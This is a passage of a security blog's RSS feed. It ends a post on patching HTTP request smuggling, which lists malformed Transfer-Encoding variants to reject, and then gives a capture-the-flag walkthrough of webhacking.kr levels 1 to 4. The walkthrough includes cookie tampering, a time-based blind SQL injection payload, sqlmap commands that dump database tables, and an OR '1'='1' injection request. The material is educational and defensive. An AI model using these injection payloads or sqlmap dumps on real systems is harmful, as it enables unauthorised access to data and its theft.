&lt;p&gt;It should be noted that &lt;a href=&quot;https://tools.ietf.org/html/rfc2616#section-4.4&quot;&gt;RFC 2616 4.4#3&lt;/a&gt; is obsolete and has been replaced by &lt;a href=&quot;https://tools.ietf.org/html/rfc7230&quot;&gt;RFC 7230&lt;/a&gt;. &lt;a href=&quot;https://tools.ietf.org/html/rfc7230&quot;&gt;RFC 7230&lt;/a&gt; should be taken into consideration when implementing a fix. As such, when processing HTTP requests with both a Content-Length and Transfer encoding header, the correct behavior here is that the frontend should strip out the Content-length header before forwarding the request to a downstream backend, not return an HTTP 400 response header. The same should be done to requests with multiple Content-Length headers as stated in &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.2&quot;&gt;RFC 7230#3.3.2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As mentioned in RFC 7230 Section 3.3.2, if an HTTP request is received with multiple Content-Length headers with different length values, this can be remediated with an HTTP 400 response, or the duplicated field-values should be replaced with a single valid Content-Length field. Snyk recommends that low-level HTTP libraries opt to replace multiple headers with a single valid header.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disallow malformed Transfer-Encoding headers and correct Processing of Multiple TE values&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remediation:&lt;/strong&gt; This remediation will prevent TE:TE attacks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Scope:&lt;/strong&gt; Frontend, Backend&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt; If both a frontend and backend prioritizes the Transfer-Encoding header, it could allow smuggling attacks where an attacker inserts two Transfer-Encoding headers, one which would be ignored by the frontend and is processed by the backend and vice versa. As such, the following type of header variations should be rejected.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;TE header variation&lt;/th&gt;
      &lt;th&gt;Details&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding: chunked&lt;/td&gt;
      &lt;td&gt;Spaces before the &quot;chunked&quot; value are removed.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding : chunked&lt;/td&gt;
      &lt;td&gt;The header contains extra spaces. This is in violation of RFC 7230.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding: chunked&lt;/td&gt;
      &lt;td&gt;Trailing characters before the header.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding: chunk&lt;/td&gt;
      &lt;td&gt;The value &quot;chunk&quot; is provided which gets. Normalized by the server and is treated as chunked encoding.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding: chunked&lt;/td&gt;
      &lt;td&gt;Multiple spaces before the &quot;chunked&quot; value&quot;.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding: &quot;chunked&quot;&lt;/td&gt;
      &lt;td&gt;The header value is provided inside double quotes which get normalized. Single quotes should also be taken into consideration.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding: chunked&lt;/td&gt;
      &lt;td&gt;CRLF characters are provided before the &quot;chunked&quot; value.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Transfer-Encoding: xchunked&lt;/td&gt;
      &lt;td&gt;The invalid character &quot;x&quot; will be removed by the backend server. Considerations should also be taken into account for unicode values provided before &quot;chunked&quot;. Other examples include &quot;ch-nked&quot;.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;However, it should be noted that it's still possible for attackers to find a malformed header variation of &quot;chunked&quot; encoding that is not documented above. As such, this alone should not be taken into account for remediation. A better approach would be to disallow requests with both Content-Length and Transfer-Encoding, along with disallowing malformed headers.&lt;/p&gt;

&lt;p&gt;Lastly, It should also be noted that if the &quot;chunked&quot; value is specified with other Transfer-Encoding values such as &quot;gzip&quot; or &quot;deflate&quot;, it shouldn't be overlooked and Transfer-Encoding should be prioritized over Content-Length. An example of this vulnerability occurring can be seen in CVE-2019-16786. If an HTTP request is sent with the following Transfer-Encoding values, the &quot;chunked&quot; value should be correctly identified and prioritized:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Transfer-Encoding: gzip, chunked
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Within a Transfer-Encoding header, several values can be listed separated by a comma. However, there might be cases where a frontend might only identify the &quot;gzip&quot; value and as such will prioritize the Content-Length header, and the backend might process this as a chunked request resulting in a CL:TE attack. Snyk recommends, whenever multiple values are specified that they are checked correctly and, if &quot;chunked&quot; is specified, then Transfer-Encoding be prioritized. Furthermore, if multiple transfer encoding headers are specified, the &quot;chunked&quot; value should only be present as the last value after other transfer encoding values are specified. This is stated in &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.1&quot;&gt;RFC 7230 Section 3.3.1&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Wrapping up&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To conclude, HTTP request smuggling can be a confusing vulnerability to understand and patch against. This blog hopes to help maintainers write efficient patches and secure their open source projects.&lt;/p&gt;

&lt;p&gt;It is also worth noting that this blog post only covers two techniques of HTTP request smuggling and does not provide detailed information regarding different exploitation scenarios. The following article from Security researcher ZeddYu has covered HTTP request smuggling extensively and has provided in-depth details regarding each attack smuggling vector: &lt;a href=&quot;https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/&quot;&gt;Zeddy Yu:&lt;/a&gt;&lt;a href=&quot;https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/&quot;&gt;Help you understand HTTP Smuggling in one article&lt;/a&gt;.&lt;/p&gt;

</description>
        <pubDate>Tue, 30 Jun 2020 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/web-application-security/2020/06/30/28_Demystifying_HTTP_request_smuggling.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web-application-security/2020/06/30/28_Demystifying_HTTP_request_smuggling.html</guid>
        
        
        <category>web-application-security</category>
        
      </item>
    
      <item>
        <title>Webhacking.kr Solutions</title>
        <description>&lt;p&gt;This blog post contains a walk-through of &lt;a href=&quot;https://webhacking.kr/&quot;&gt;https://webhacking.kr/&lt;/a&gt; wargames which was recommended to me by a friend.&lt;/p&gt;

&lt;h3 id=&quot;level-1&quot;&gt;Level 1&lt;/h3&gt;

&lt;p&gt;The following can be seen in level 1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The source code of the backend application can be read by clicking the view source button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/1-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A cookie called &lt;code class=&quot;highlighter-rouge&quot;&gt;user_lv&lt;/code&gt; is being set every time the user visits the page which has a numeric value. If this value is more that 6, then the backend application will set it to 1. If this value is more than 5, then the &lt;code class=&quot;highlighter-rouge&quot;&gt;solve&lt;/code&gt; function can be triggered.&lt;/p&gt;

&lt;p&gt;This function can be triggered by sending a value such as &lt;code class=&quot;highlighter-rouge&quot;&gt;5.5&lt;/code&gt; which is smaller than &lt;code class=&quot;highlighter-rouge&quot;&gt;6&lt;/code&gt; and is higher than &lt;code class=&quot;highlighter-rouge&quot;&gt;5&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /challenge/web-01/ HTTP/1.1
Host: webhacking.kr
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://webhacking.kr/old.php
Connection: close
Cookie: user_lv=5.5; PHPSESSID=qksuhplclrtd25armt59rkatn6
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;level-2&quot;&gt;Level 2&lt;/h3&gt;

&lt;p&gt;The following can be seen in the HTML markup of the level 2 page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the response, a cookie named &lt;code class=&quot;highlighter-rouge&quot;&gt;time&lt;/code&gt; is being set which reflects the date and time value show in the above HTML comment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The presence of SQL Injection can be discovered by trying a query such as &lt;code class=&quot;highlighter-rouge&quot;&gt;1604695706 AND 1=1&lt;/code&gt; which returns true returns the following data: &lt;code class=&quot;highlighter-rouge&quot;&gt;2070-01-01 09:00:01&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;1604695706 AND 1=2&lt;/code&gt; which returns &lt;code class=&quot;highlighter-rouge&quot;&gt;2070-01-01 09:00:00&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Since the vulnerability is a blind based SQL injection, time-based blind techniques can be used to iterate through characters and compare them with the index of the current database name using an IF statement, and if this statement is true, then the MySQL &lt;code class=&quot;highlighter-rouge&quot;&gt;sleep&lt;/code&gt; function is triggered for 5 seconds. An example of this can be seen below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1604695706 AND 7678=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&amp;gt;48),SLEEP(5),7678)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The same technique can be used to iterate through and extract more data.&lt;/p&gt;

&lt;p&gt;SQLMap can be used to automate this process.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To get the current database the application is running under, the ` ‚Äìcurrent-db` option can be used which reveals the current database to be ‚Äòchall2‚Äô.&lt;/p&gt;

&lt;p&gt;SQLMap can then be used to get the tables belonging to this database.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6' -D chall2 --table

Database: chall2
[2 tables]
+---------------+
| admin_area_pw |
| log           |
+---------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;--dump&lt;/code&gt; option can be used to extract the password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This can be used to complete challenge 2.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-3&quot;&gt;Level 3&lt;/h3&gt;

&lt;p&gt;Level 3 presents a Nonogram/Sudoku puzzle. This can be read as follows: Horizontally, the last line has 5 black colors, second to last 2 colors etc etc. An example of this can be seen below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After multiple tries, this was found to be the correct answer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You are then presented with the following form.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A hidden parameter exists which is vulnerable to SQL injection, this can be exploited as follows.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /challenge/web-03/index.php HTTP/1.1
Host: webhacking.kr
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: https://webhacking.kr
Connection: close
Referer: https://webhacking.kr/challenge/web-03/index.php?_1=1&amp;amp;_2=0&amp;amp;_3=1&amp;amp;_4=0&amp;amp;_5=1&amp;amp;_6=0&amp;amp;_7=0&amp;amp;_8=0&amp;amp;_9=0&amp;amp;_10=0&amp;amp;_11=0&amp;amp;_12=1&amp;amp;_13=1&amp;amp;_14=1&amp;amp;_15=0&amp;amp;_16=0&amp;amp;_17=1&amp;amp;_18=0&amp;amp;_19=1&amp;amp;_20=0&amp;amp;_21=1&amp;amp;_22=1&amp;amp;_23=1&amp;amp;_24=1&amp;amp;_25=1&amp;amp;_answer=1010100000011100101011111
Cookie: PHPSESSID=qksuhplclrtd25armt59rkatn6
Upgrade-Insecure-Requests: 1

answer='+OR+'1'='1&amp;amp;id=SS
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-4&quot;&gt;Level 4&lt;/h3&gt;

&lt;p&gt;The following code is presented for Level 4.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
  include &quot;../../config.php&quot;;
  if($_GET['view-source'] == 1) view_source();
?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Challenge 4&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;9pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
  sleep(1); // anti brute force
  if((isset($_SESSION['chall4'])) &amp;amp;&amp;amp; ($_POST['key'] == $_SESSION['chall4'])) solve(4);
  $hash = rand(10000000,99999999).&quot;salt_for_you&quot;;
  $_SESSION['chall4'] = $hash;
  for($i=0;$i&amp;lt;500;$i++) $hash = sha1($hash);
?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;center&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cellpadding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;colspan=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;background:silver;color:green;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=$hash?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;center&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?view-source=1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;[view-source]&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above PHP code takes a number between 10000000 and 99999999 and merges it with &lt;code class=&quot;highlighter-rouge&quot;&gt;salt_for_you&lt;/code&gt;. This value is then encrypted 500 times with the &lt;code class=&quot;highlighter-rouge&quot;&gt;sha1&lt;/code&gt; hashing algorithm.&lt;/p&gt;

</description>
        <pubDate>Fri, 03 Apr 2020 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/capture-the-flag/2020/04/03/04_webhacking_kr_solutions.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture-the-flag/2020/04/03/04_webhacking_kr_solutions.html</guid>
        
        
        <category>capture-the-flag</category>
        
      </item>
    
  </channel>
</rss>
